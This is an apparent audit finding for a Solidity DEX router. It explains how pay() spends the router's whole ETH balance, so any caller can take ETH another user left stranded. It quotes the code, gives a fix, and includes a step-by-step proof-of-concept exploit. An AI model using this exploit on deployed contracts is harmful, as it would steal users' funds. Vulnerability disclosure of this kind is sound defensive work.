### Title
Router `pay()` Consumes Unattributed Native ETH Balance to Settle Any Caller's WETH Obligation, Enabling Theft of Stranded ETH — (File: `metric-periphery/contracts/base/PeripheryPayments.sol`)

---

### Summary

The `pay()` function in `PeripheryPayments.sol` uses `address(this).balance` — the router's **entire** native ETH balance — to cover WETH swap obligations for any caller. Because the router holds no per-user ETH attribution, any ETH stranded on the router from a prior user's `msg.value` can be silently consumed to settle a completely different user's WETH payment, giving that second user a free swap and permanently stealing the first user's ETH.

---

### Finding Description

`pay()` is the internal settlement function called from `_justPayCallback` and `_exactOutputIterateCallback` whenever the pool demands WETH from an external payer:

```solidity
// PeripheryPayments.sol:69-88
function pay(address token, address payer, address recipient, uint256 value) internal {
    if (payer == address(this)) {
        IERC20(token).safeTransfer(recipient, value);
    } else if (token == WETH) {
        uint256 nativeBalance = address(this).balance;   // ← entire router ETH balance
        if (nativeBalance >= value) {
            IWETH9(WETH).deposit{value: value}();
            IERC20(WETH).safeTransfer(recipient, value);
        } else if (nativeBalance > 0) {
            IWETH9(WETH).deposit{value: nativeBalance}();
            IERC20(WETH).safeTransfer(recipient, nativeBalance);
            IERC20(WETH).safeTransferFrom(payer, recipient, value - nativeBalance);
        } else {
            IERC20(WETH).safeTransferFrom(payer, recipient, value);
        }
    } else {
        IERC20(token).safeTransferFrom(payer, recipient, value);
    }
}
``` [1](#0-0) 

When `token == WETH` and `payer != address(this)`, the function checks `address(this).balance` — the router's **total** native ETH — and uses it first, before pulling from `payer`. There is no mechanism to track which user's `msg.value` contributed to that balance. Any ETH left on the router from a previous call (because the user sent more `msg.value` than `amountIn` and omitted `refundETH()`) is indistinguishable from the current caller's ETH.

The `receive()` guard only blocks direct ETH pushes:

```solidity
receive() external payable {
    if (msg.sender != WETH) revert NotWETH();
}
``` [2](#0-1) 

But `multicall` is `payable`, so ETH legitimately arrives via `msg.value` and can remain on the router if the user does not append `refundETH()`:

```solidity
function multicall(bytes[] calldata data) public payable override returns (bytes[] memory results) {
    results = new bytes[](data.length);
    for (uint256 i = 0; i < data.length; i++) {
        results[i] = Address.functionDelegateCall(address(this), data[i]);
    }
}
``` [3](#0-2) 

The callback path that triggers `pay()` is:

```
exactInputSingle → _setNextCallbackContext(payer=msg.sender, token=WETH)
               → pool.swap → metricOmmSwapCallback → _justPayCallback
               → pay(WETH, msg.sender, pool, amountIn)
``` [4](#0-3) [5](#0-4) 

---

### Impact Explanation

**Direct loss of user principal.** User A's stranded ETH is consumed to settle User B's WETH obligation. User B receives full swap output without spending any ETH or WETH. User A's ETH is permanently lost (it is deposited as WETH and transferred to the pool on behalf of User B). The loss equals the full stranded ETH amount — 100% of the stranded principal — which trivially exceeds the Critical threshold (>20%, >$100 USD) for any non-dust amount.

---

### Likelihood Explanation

**Medium.** ETH stranding requires a user to send `msg.value > amountIn` without appending `refundETH()`. This is a realistic omission:

- Integrators or wallets that construct multicalls may over-estimate `msg.value` as a safety buffer and omit `refundETH()`.
- A user calling `exactInputSingle` directly (not via multicall) with `msg.value > amountIn` strands the excess immediately.
- The protocol's own test suite documents the expected pattern (`multicall{value}(swap, refundETH)`) but does not enforce it at the contract level.

Once ETH is stranded, exploitation requires zero privileges — any address can call `exactInputSingle(tokenIn=WETH, amountIn=strandedAmount)` with no ETH and no WETH approval and receive the full swap output.

---

### Recommendation

Track only the ETH that belongs to the current call context. Replace the unconditional `address(this).balance` read with the amount of ETH the current caller actually sent (`msg.value`), or record the pre-call balance and use only the delta. A minimal fix:

```solidity
// Pass msg.value explicitly into pay() for the WETH branch, or
// snapshot balance before the swap and use only the increase.
uint256 nativeBalance = address(this).balance - _balanceBeforeCall; // delta only
```

Alternatively, enforce that any `msg.value` surplus is always refunded atomically at the end of `multicall` (revert if `address(this).balance > 0` after all delegatecalls complete), so no ETH can ever be stranded.

---

### Proof of Concept

```
Setup:
  - Router deployed with WETH address.
  - Pool(WETH, token1) exists and has liquidity.
  - User A has 1 ETH. User B has 0 ETH and 0 WETH (no approvals).

Step 1 — User A strands ETH:
  vm.prank(userA);
  bytes[] memory calls = new bytes[](1);
  calls[0] = abi.encodeCall(router.exactInputSingle, ExactInputSingleParams({
      pool: pool, tokenIn: WETH, tokenOut: token1,
      zeroForOne: true, amountIn: 0.5 ether,
      amountOutMinimum: 0, recipient: userA,
      deadline: block.timestamp + 1, priceLimitX64: 0, extensionData: ""
  }));
  router.multicall{value: 1 ether}(calls);
  // 0.5 ETH used for swap; 0.5 ETH stranded on router (no refundETH).
  assert(address(router).balance == 0.5 ether);

Step 2 — User B steals stranded ETH (no ETH, no WETH, no approval):
  vm.prank(userB);
  router.exactInputSingle(ExactInputSingleParams({
      pool: pool, tokenIn: WETH, tokenOut: token1,
      zeroForOne: true, amountIn: 0.5 ether,
      amountOutMinimum: 0, recipient: userB,
      deadline: block.timestamp + 1, priceLimitX64: 0, extensionData: ""
  }));
  // pay(WETH, userB, pool, 0.5 ether) fires in callback.
  // address(this).balance == 0.5 ether (User A's ETH).
  // Router deposits 0.5 ETH as WETH and sends to pool.
  // User B receives token1 output. User A's 0.5 ETH is gone.
  assert(address(router).balance == 0);
  assert(token1.balanceOf(userB) > 0);
``` [6](#0-5)

### Citations

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L32-34)
```text
  receive() external payable {
    if (msg.sender != WETH) revert NotWETH();
  }
```

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L69-88)
```text
  function pay(address token, address payer, address recipient, uint256 value) internal {
    // If the payer is contract it means we are in the middle of a path. In the middle of a path we operate on ERC20 only.
    if (payer == address(this)) {
      IERC20(token).safeTransfer(recipient, value);
    } else if (token == WETH) {
      uint256 nativeBalance = address(this).balance;
      if (nativeBalance >= value) {
        IWETH9(WETH).deposit{value: value}();
        IERC20(WETH).safeTransfer(recipient, value);
      } else if (nativeBalance > 0) {
        IWETH9(WETH).deposit{value: nativeBalance}();
        IERC20(WETH).safeTransfer(recipient, nativeBalance);
        IERC20(WETH).safeTransferFrom(payer, recipient, value - nativeBalance);
      } else {
        IERC20(WETH).safeTransferFrom(payer, recipient, value);
      }
    } else {
      IERC20(token).safeTransferFrom(payer, recipient, value);
    }
  }
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L39-44)
```text
  function multicall(bytes[] calldata data) public payable override returns (bytes[] memory results) {
    results = new bytes[](data.length);
    for (uint256 i = 0; i < data.length; i++) {
      results[i] = Address.functionDelegateCall(address(this), data[i]);
    }
  }
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L67-86)
```text
  function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut) {
    _checkDeadline(params.deadline);
    uint128 priceLimitX64 = MetricOmmSwapPath.normalizePriceLimit(params.zeroForOne, params.priceLimitX64);

    _setNextCallbackContext(params.pool, CALLBACK_MODE_JUST_PAY, msg.sender, params.tokenIn);
    (int128 amount0Delta, int128 amount1Delta) = IMetricOmmPoolActions(params.pool)
      .swap(
        params.recipient,
        params.zeroForOne,
        MetricOmmSwapInputs.asAmountSpecifiedIn(params.amountIn),
        priceLimitX64,
        "",
        params.extensionData
      );
    int128 out = MetricOmmSwapResults.extractAmountOut(params.zeroForOne, amount0Delta, amount1Delta);
    amountOut = MetricOmmSwapInputs.int128ToUint128(out);
    if (amountOut < params.amountOutMinimum) revert InsufficientOutput(amountOut, params.amountOutMinimum);

    _clearExpectedCallbackPool();
  }
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L192-199)
```text
  function _justPayCallback(int256 amount0Delta, int256 amount1Delta) private {
    pay(
      _getTokenToPay(),
      _getPayer(),
      msg.sender,
      uint256(MetricOmmSwapResults.extractPositiveAmount(amount0Delta, amount1Delta))
    );
  }
```
